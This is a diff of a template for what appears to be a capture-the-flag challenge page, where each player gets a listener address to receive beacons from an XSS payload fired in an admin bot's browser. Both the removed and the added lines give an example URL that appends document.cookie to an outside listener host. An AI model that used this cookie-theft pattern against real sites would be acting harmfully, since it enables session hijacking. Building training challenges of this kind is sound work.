@@ -9,12 +9,10 @@
 <div class="desc">
   <p>Point your payload's beacon at <strong>your</strong> address below. Only hits sent here
   show up on this page — other players have their own bucket.</p>
-  <p><strong>In the victim's browser (the admin bot lives on the challenge network):</strong></p>
-  <pre class="sql">http://listener/l/{{ lid }}</pre>
-  <p><strong>From your own machine (manual test / <code>curl</code> / <code>ncat</code> reference):</strong></p>
-  <pre class="sql">http://localhost:8091/l/{{ lid }}</pre>
-  <p class="muted">Tack the stolen data onto the URL, e.g.
-  <code>http://listener/l/{{ lid }}/?c=${encodeURIComponent(document.cookie)}</code>.</p>
+  <pre class="sql">https://listener.{{ domain }}/l/{{ lid }}</pre>
+  <p class="muted">Same address works from the victim's browser and from your own machine
+  (<code>curl</code>/<code>ncat</code> reference). Tack the stolen data onto the URL, e.g.
+  <code>https://listener.{{ domain }}/l/{{ lid }}/?c=${encodeURIComponent(document.cookie)}</code>.</p>
 </div>
 
 {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
